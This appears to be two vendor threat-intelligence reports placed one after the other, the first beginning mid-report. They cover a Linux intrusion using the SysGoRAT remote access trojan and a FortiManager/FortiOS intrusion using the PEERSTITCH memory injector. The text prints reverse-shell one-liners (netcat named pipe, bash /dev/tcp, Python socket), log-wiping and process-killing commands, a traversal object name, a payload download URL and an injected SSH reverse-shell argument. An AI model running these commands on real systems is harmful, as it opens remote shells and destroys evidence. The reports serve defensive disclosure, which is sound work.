The attackers inserted a line of code into a PHP login page — most likely targeting a database authentication routine — to harvest admin credentials. If an administrator logs in, the code forwards the username and password to the attackers’ log file. Figure 5 shows a snippet of a PHP script including the code added by the attackers.

Scanning for Cleartext Passwords

The attackers searched for email, SMTP and database passwords inside configuration files and command history files. Figure 6 shows an example of commands that the attackers used to search for cleartext passwords.

SysGoRAT Malware

The attackers deployed a custom-developed, multi-platform remote access Trojan (RAT) written in Go, first observed under the benign file name sys-control-client. We named this malware SysGoRAT. This malware supports cross-platform execution on Windows and Linux and employs multiple persistence methods to maintain long-term access.

The malware established a command and control (C2) connection over WebSocket to wss://<addr>/ws. This WebSocket address defaults to a hardcoded IP address 104.194.158[.]65:443, which the malware operator can modify via a command-line parameter at execution. SysGoRAT supports a fixed set of seven command types, described in Table 1.

Action

Behavior

command

Executes arbitrary commands via /bin/sh -c (Linux) or cmd /C (Windows)

control

Dispatches one of four sub-actions (see Control Sub-Actions in Appendix A)

list_dir

Lists directory content

shell_input

Creates an interactive shell session

proxy_connect

Establishes a TCP connection to an arbitrary target

proxy_data

Relays data bidirectionally to an established proxy connection

proxy_close

Terminates and removes a proxy session

Table 1. SysGoRAT command types.

The malware’s sub-actions provide additional capabilities and persistence methods, detailed in Appendix A.

The attackers renamed the binary on disk to blend in, using different benign names on targeted endpoints, including:

sys-control-client

pip2.7

ea_install

./semanage

In-Memory Reverse Shells

The attackers employed multiple reverse shell techniques across at least seven distinct C2 servers. To avoid leaving forensic artifacts on the disk, these shells operated almost entirely in memory using built-in system utilities:

Named pipe via Netcat: The primary method, deployed across three separate C2 servers, used a named pipe pattern to execute bash commands directly over a network socket.

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc <C2> <port> >/tmp/f

1

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc <C2> <port> >/tmp/f

Bash TCP redirects: The attackers redirected the output of bash commands to an attacker-controlled external IP address.

bash -i >& /dev/tcp/[IP]/[PORT] 0>&1

1

bash -i >& /dev/tcp/[IP]/[PORT] 0>&1

Python subprocesses: The attackers ran a Python script to spawn a remote interactive shell. They achieved this by opening an outbound network socket and binding it to a /bin/bash process, giving them an accessible command-line interface.

python3 -c "import socket,subprocess,os; s=socket.socket(...); s.connect(('[IP]',[PORT])); os.dup2(...); subprocess.call(['/bin/bash','-i'])")

1

python3 -c "import socket,subprocess,os; s=socket.socket(...); s.connect(('[IP]',[PORT])); os.dup2(...); subprocess.call(['/bin/bash','-i'])")

Organizations can defend against reverse shell techniques by enforcing strict outbound firewall rules and using endpoint detection to spot standard utilities that spawn interactive shells. Figure 7 shows the reverse shell command that Cortex XDR detected and prevented.

Targeting Mailboxes for Social Media Account Access

The attackers targeted official government mail servers to steal emails and facilitate access to external social media accounts.

In this operation, the attackers enumerated the /var/qmail/mailnames/ directories for several domains and counted the number of emails stored in specific users’ Maildir/cur/ directories to identify targets.

Next, the attackers searched for social media-related emails. They deployed a PHP script, named search_social.php, that searched for specific keywords in email headers and displayed the results in a user-friendly format. Figure 8 shows the first part of the script.

The script then parsed the response and displayed the exact file path, social media account email sender, recipient and subject.

Figure 9 demonstrates the expected output.

After identifying the specific emails they wanted to exfiltrate, the attackers attempted to generate a bash script named zip_mails.sh that would iterate through users’ directories and compress their emails into ZIP archives. Figure 10 shows this command.

This bash script is intended to exfiltrate an entire mailbox rather than a specific social-media-related file identified by the previously analyzed script. In this particular instance, we found that the script contained syntax errors, such as a broken variable assignment user=\;) and would fail upon execution.

We found indications that the attackers also intended to exfiltrate multiple databases and steal highly sensitive government data. The data exfiltration techniques the attackers used are detailed in Appendix B.

Defense Evasion and Anti-Forensics Attempts

A core component of the attackers’ playbook involved anti-forensics techniques, specifically:

Attempting to disable endpoint protections

Tampering with logs

Timestomping

Disguising malicious activity

Deleting residual artifacts to hinder post-incident analysis

This section details the specific evasion techniques and cleanup commands the attackers used to cover their tracks.

Disabling Endpoint Protection

One of the techniques the attackers used for defense evasion was an attempt to disable security protection devices on the compromised hosts. As Figure 11 shows, the attackers executed bash scripts that use the Linux commands pgrep and pkill to attempt to terminate Cortex XDR-related processes on infected systems.

These attempts were successfully detected and mitigated by Cortex XDR, with telemetry confirming that endpoint protections were not suppressed.

Removing Scripts After Execution

Throughout the campaign, the attackers ensured that single-use scripts were removed after execution by formulating a single command that:

Wrote the script to disk

Executed the script

Removed the script using rm

Figure 12 shows an example of this procedure as executed by the attackers.

Timestomping

For scripts that were meant for long-term use, the attackers used timestomping.

They used the command touch -t to change the access and modification time of malicious files, to make them appear as if they were created long before the attack started. The goal of this technique is to evade analysis by misleading analysts into believing the file is unrelated to malicious activity, due to its creation time predating the attack timeline.

Disguising Activity as Red Team Operations

In several instances, we observed the attackers employing planted deception techniques to mislead post-incident analysis. They attempted to disguise their activity as a red team operation, by using operational indicators such as the key RedTeamOps2025 in one of the malicious scripts, and pentest123 as a password for a user the attackers created.

Cleaning Up Logs and Residual Files

Following the exfiltration attempts, the attackers initiated a full cleanup of log files and malicious residual files on the systems. This cleanup included attempts to delete logs related to:

Authentication

Command history

Email activity

Operating system (OS)

Web server

Active PHP user sessions

Figure 13 shows the execution of shell commands to delete various log files from the system.

Following the mass log deletion, the attackers executed several automated cleanup commands and scripts, and verified that any evidence of the exfiltration was deleted.

Figure 14 shows one of the attackers’ cleanup scripts, including the original inline comments. The script attempts to delete various logs across the system for a second time and to remove any files from /tmp/, where the attackers stored malicious scripts.

After the cleanup phase, the attackers attempted to verify the removal of evidence, checking whether IP addresses they used were removed from system log files, as Figure 15 shows.

Additional commonly used TTPs that the attackers leveraged throughout the campaign are detailed in Appendix B.

Conclusion

This campaign demonstrates how attackers are combining traditional post-exploitation techniques with AI-accelerated workflows to target governmental Linux server infrastructure. By leveraging AI to rapidly generate, adapt and deploy operational scripts, the attackers behind CL-UNK-1211 maintained a fast pace of operation while minimizing manual developer overhead.

The attackers behind this activity exhibited a deep understanding of the Linux OS, employing techniques such as:

Global PHP configuration hijacking for persistent access

Command-line credential harvesting and privilege escalation using different shells

Alongside open-source utilities, their toolkit featured custom tools, including a multi-platform Go RAT and custom vulnerability scanners.

The attackers also maintained a thorough cleanup strategy to thwart forensic analysis, by erasing system logs and attempting to disable endpoint protections. Despite these evasion efforts, endpoint security controls effectively neutralized their activity. Cortex XDR detected and prevented the process termination attempts targeting the agent.

Attackers continue to adopt AI to streamline payload development and scale their campaigns.

Comprehensive visibility into Linux servers, databases and environments remains critical to countering attackers’ efforts and strengthening enterprise security.

Executive Summary

Unit 42 investigated a multi-stage network intrusion against a telecommunications organization that occurred in September 2024, which we are tracking as cluster CL-STA-0954 (aka UNC5820). The attackers behind CL-STA-0954 achieved an initial compromise by exploiting CVE-2024-47575 against a centralized FortiManager appliance.

From that single appliance, our observations are that the attackers exfiltrated an archive containing running configurations, cryptographic material and database files containing information about more than 500 managed FortiGate firewalls. Those firewalls protected the target's own infrastructure and the networks of its clients.

Following the initial compromise, the attackers behind CL-STA-0954 demonstrated a complex level of tradecraft. Aspects of the post-exploitation activity overlap with intrusions attributed to suspected nation-state actors. Armed with the stolen information, the attackers:

Maintained long-term access

Intercepted network traffic

Established VPN sessions

Deployed backdoors

Exploited a separate privilege-escalation vulnerability

The attackers exploited another vulnerability, CVE-2025-61624, via FortiOS auto-script path traversal. This exploit facilitated the deployment of PEERSTITCH, a novel, memory-resident ARM64 malware.

PEERSTITCH leaves no persistent binary on disk, opens no listening ports and initiates no outbound network connections. Instead, it communicates through traffic generated by legitimate processes on the infected host, which makes the malware resistant to conventional endpoint and network detection.

The attackers also impersonated the FortiManager platform to pull from managed firewalls of other hosts in the targeted network.

Overview of the Intrusion

We investigated a prolonged network intrusion against a telecommunications managed service provider. The attackers demonstrated proficiency in Fortinet appliance architecture, FortiOS internals and FortiOS management protocols.

Our investigation spanned the provider's own environment. We did not examine the client networks whose firewalls the provider managed. The exposure described in this report is of configuration and credential material rather than confirmed intrusion into those networks. Figure 1 below shows a flowchart illustrating an overview of the intrusion.

Initial Access and Network Configuration Theft (CVE-2024-47575)

During the initial phase of the intrusion, the attackers exploited CVE-2024-47575 (referred to by external parties as FortiJump). The vulnerability allows an unauthenticated remote attacker to execute arbitrary commands via crafted requests to the FMG-Access (TCP port 541) management channel.

During the exploitation, the attackers registered a rogue Virtual FortiGate appliance named localhost (serial number FMG-VMTM23017412) to the central FortiManager instance, originating from external attacker infrastructure (45.32.41[.]202, later modified to 198.199.122[.]22).

Immediately following device registration, the attacker generated a configuration archive named .tm in the FortiManager file system, which they exfiltrated shortly thereafter. Analysis of this artifact revealed:

The FortiManager appliance's own serial number and its management relationships to every enrolled device

Complete running configuration files for more than 500 managed FortiGate firewalls across internal infrastructure and client networks

Central management SQLite databases: global.db (containing administrative domains, global objects and policy packages) and revinfo.db (containing device revision metadata)

A flat text inventory listing more than 500 FortiGate serial numbers alongside their respective public IP addresses

Internal network topology maps, routing tables and interface configurations

Ciphertext administrative, local and SSL/VPN credentials

Encoded cryptographic trust material, including public certificates and private keys

Credential Decryption and Initial Re-Entry

The exfiltrated FortiGate configurations contained sensitive credentials stored as reversible ciphertext. We confirmed that the credentials were recoverable by successfully brute-forcing administrative and SSL/VPN passwords from the exfiltrated configuration files.

Using legitimate credentials, the attackers established unauthorized FortiGate SSL/VPN sessions to perimeter firewalls from known external staging infrastructure (23.240.77[.]233 and 47.18.167[.]159). These sessions granted the attackers authenticated access into internal network-management segments.

Privilege Escalation: CVE-2025-61624

During the intrusion, the attackers exploited CVE-2025-61624 to escalate from FortiOS administrative access to root on the underlying firewall operating system. A FortiOS administrator, including a super_admin, operates within a restricted management command line with no shell access and no direct control over the appliance file system or its running processes. The daemons that implement FortiOS run as root beneath that interface.

The vulnerability allows an authenticated administrative account to read and write arbitrary files as root via path traversal in the FortiOS CLI system.auto-script engine. The auto-script object name is not sanitized, allowing a name containing traversal sequences to place the script body outside the intended directory, at any file system location. The script executes with the privileges of the auto-script engine.

The sanitized event below highlights the creation of the traversal object ../../../../setup used to drop the PEERSTITCH initial-stage loader shown below in Figure 2.

Technical Analysis of the PEERSTITCH Implant

PEERSTITCH is a 64-bit Linux ARM64 executable written in C and statically linked against glibc. It acts as a one-shot process memory patching injector targeting two core FortiOS daemons:

/bin/miglogd: The central system and traffic logging daemon

/bin/iked: The IKE/IPsec VPN service daemon handling cryptographic negotiation

Figure 3 shows a flow chart of PEERSTITCH activity, which we will examine in greater detail.

Delivery and Staging Chain

1). Downloader initialization: Exploiting CVE-2025-61624, the attackers pushed ../../../../setup to a select number of firewalls

2). Payload retrieval: The script downloaded five files from hxxp[:]//23.240.77[.]233:8085/ into /data2/template/:

pM.js: Environment preparation script (self-deleting)

a.js (saved as index.js): Emscripten JavaScript runtime module

a.wasm (saved as index.wasm): Compiled WebAssembly binary module

b.js (saved as ipssem.js): Deployment orchestrator script

dd (saved as lldprx): Native ARM64 ELF binary injector (PEERSTITCH core)

3). Execution: Following an execution delay, ipssem.js launched lldprx with arguments lldprx!index.js!index.wasm!ipssem.js!lldprx!yyyy!pM.js

Injector Execution and Process Parasitization

The lldprx binary performs a single-pass execution sequence:

Process discovery: Iterates through /proc/, parses /proc/<pid>/cmdline and locates the process identifiers (PIDs) for /bin/miglogd and /bin/iked

Memory layout enumeration: Reads /proc/<pid>/maps to extract the base addresses and memory boundaries of both target daemons

Process attachment: Attaches to both running processes using ptrace(PTRACE_SEIZE, pid) and halts execution via PTRACE_INTERRUPT

Register state capture: Calls ptrace(PTRACE_GETREGSET, pid) to snapshot all ARM64 general-purpose registers (X0 through X30), the stack pointer (SP) and program counter (PC)

Dynamic shellcode construction: Generates an ARM64 bootstrap stub dynamically. The bootstrap executes an mmap syscall (X8 = 0xDE) requesting 0x4000 (16,384 bytes) of PROT_READ | PROT_WRITE | PROT_EXEC (RWX) memory mapped as MAP_PRIVATE | MAP_ANONYMOUS

Payload injection: Writes a 1,344-byte injection payload into the newly allocated RWX buffer via /proc/<pid>/mem

Covert IPC and Cross-Daemon Memory Sharing

Instead of using network sockets or disk files, PEERSTITCH creates a covert, memory-resident communication bridge between /bin/miglogd and /bin/iked.

Figure 4 shows a flowchart for PEERSTITCH network traffic.

Passive traffic monitoring: Inside both daemons, the hook code inspects data already passing through the process without redirecting packets. It evaluates string patterns using strstr() for two specific markers:

TCP port marker: 8550 (embedded within traffic data, not a listening port)

IP address marker: 169.254.0.1 (link-local identifier used for pattern matching)

Tag extraction and buffering: When a marker is identified, the hook extracts an associated session token or identifier (up to 31 bytes) and writes it into a 16-slot circular ring buffer at offset +0x0F0

Cross-process write: The hook iterates through its forwarding table at offset +0x400 (populated with the counterpart daemon's PID and buffer base address). It invokes open(), lseek() and write() on /proc/<counterpart_pid>/mem, writing the extracted tag directly into the other daemon's memory.

Conditional execution branching: When /bin/iked processes subsequent VPN sessions, its hook inspects its injection buffer. If a corresponding tag exists, the hook takes an alternate return branch (ADRP return path), bypassing default FortiOS security validations.

Memory Patching and Branch Path Modification

To suppress tamper detection and alter default daemon routines, PEERSTITCH applies direct NOP patches (0xAA0003E0, corresponding to MOV X0, X0 on ARM64) to three static offsets within target process memory:

base + 0x106F7B8

base + 0x1072E20

base + 0x109A570

A 20-byte trampoline patch is written to base + 0x135102C to redirect standard execution into the allocated RWX hook buffer. Figure 5 shows a visual memory layout of the 16 KB buffer used by the ARM64 PEERSTITCH payload.

Apache mod_md ACME Reverse Shell Command and Control

Alongside PEERSTITCH, the attackers established a command and control channel by weaponizing the native Apache mod_md (Managing Domains) module on FortiGate firewalls. This module uses the Automated Certificate Management Environment (ACME) protocol.

The attackers pushed an auto-script object to create ../../tmp/apache2/conf/md-acme.conf, as shown below in Figure 6.

Weaponization Mechanics

1). Rogue certificate authority initialization: The account.json state file demonstrates the initial registration with the attacker's ACME server, explicitly routing ACME directory requests to external infrastructure

2). Challenge orchestration: The order.json file outlines the pending certificate order, mapping the authorization and finalization URLs directly to the attacker's server

3). Command execution via DNS-01 challenge: MDChallengeDns01 was mapped directly to /bin/node. When Apache initiates a certificate validation challenge, it executes Node.js with parameters retrieved from the remote ACME server. The job.json debug log reveals how the attackers exploited this by injecting shell commands (kali@23.240.77[.]233:8084:b -F /tmp/upfile/ssh_config -i) directly into the domain name field of the challenge request, initiating an SSH-based reverse shell.

4). Continuous polling loop: Setting MDRenewMode always forced the Apache daemon to continuously trigger these malicious renewal challenges. Because the DNS-01 challenge was mapped to /bin/node, this polling cycle ensured the continuous re-execution of the injected payload, establishing a persistent outbound reverse-shell communication channel.

Management Impersonation and FortiGate to FortiManager Chained Exploitation

FortiGate to FortiManager (FGFM) communications occur over TCP port 541 using cryptographic trust material requested and validated against appliance serial numbers. The archive exfiltrated during the initial FortiJump compromise contained this material, along with the serial numbers and management relationships of every downstream device.

Following FGFM interactions from external infrastructure over TCP port 541, an administrative account named FortiGateCloud downloaded complete running configurations from multiple managed firewalls. The victim organization operated no FortiManager Cloud tenant, and no such account was provisioned on the affected devices.

We assess with a medium degree of confidence that the attackers issued these commands by impersonating the management platform over FGFM. Two paths were available to them, and the evidence does not distinguish between them:

Exploitation of CVE-2024-26009 to bypass FGFM authentication using the FortiManager's serial number

Direct reuse of the exfiltrated trust material to authenticate as the legitimate FortiManager

Asserting a management identity requires terminating the authentic FortiManager's session. It is possible that the attackers forced this session termination using CVE-2024-26008, consistent with the intermittent tunnel management interface drops described in the Anti-Forensics and Defense Evasion section below.

We are aware of other vulnerabilities in which the FortiGateCloud account has been misused to perform unauthorized actions, including:

CVE-2025-59718

CVE-2025-59719

The related single sign-on (SSO) issues tracked under FG-IR-26-060

Each of these vulnerabilities requires the device to be enrolled in FortiGate Cloud/FortiCloud SSO, and the affected firewalls held no such enrollment. We exclude these vulnerabilities from scope for this intrusion. We note that the observed activity reused only the account name and none of the exploitation artifacts associated with those issues.

Anti-Forensics and Defense Evasion

The attackers took extensive measures to eliminate forensic artifacts:

Service termination: Executed killall -9 miglogd and killall -9 syslogd to halt local and remote syslog generation prior to executing malicious auto-scripts

Crash log clearing: Issued FortiOS diagnostic command diagnose debug crashlog clear to wipe segmentation fault logs generated during initial memory injection attempts

Configuration rollback: Automatically deleted rogue administrator accounts, rogue VPN groups and auto-script objects (../../../../setup) shortly after execution

Decoy artifact creation: Overwrote /tmp/apache2/conf/md-acme.conf with a common string found in this file (#0 certs managed by ACME\n\n\n) to mask reverse-shell configuration files

Process memory self-deletion: lldprx unlinked its own binary from disk and scanned /proc/ to terminate the staging setup process before exiting

Logging telemetry disruption: Log telemetry showed intermittent drops across the tunnel management interface during periods of malicious activity. We assess with medium confidence that the attackers deliberately induced this degradation to suppress real-time telemetry to central management consoles. This is consistent with the previously described pattern of telemetry suppression, including terminating miglogd and syslogd, clearing crash logs, and rolling back configuration objects. It’s possible that the attackers forced the disconnects using CVE-2024-26008 over TCP port 541. Available logs do not capture the triggered traffic, so we could not confirm the mechanism.

Conclusion

This intrusion highlights a growing threat, the weaponization of centralized edge management ecosystems to compromise downstream networks. One compromised appliance yielded the cryptographic keys, credentials and network topology for more than 500 firewalls, including devices protecting client organizations.

The discovery of the PEERSTITCH implant demonstrates the increasing technical maturity of edge-device malware. By operating as a one-shot injector, avoiding persistent disk artifacts and building a covert inter-process communication bridge inside process memory, the attackers achieved sustained persistence while evading traditional monitoring.

For organizations that manage infrastructure on behalf of others, the management platform is the highest-value target on the network. Compromising the management platform is not contained by the boundary of the organization that owns it. That compromise also does not end when the platform is patched.

The cryptographic trust material governing the platform's relationship with every managed device leaves with the attacker and remains valid until it is rotated. Defenders must treat edge management interfaces with the highest level of zero trust isolation. They must also treat the credentials and certificates those interfaces hold as compromised the moment the platform is.
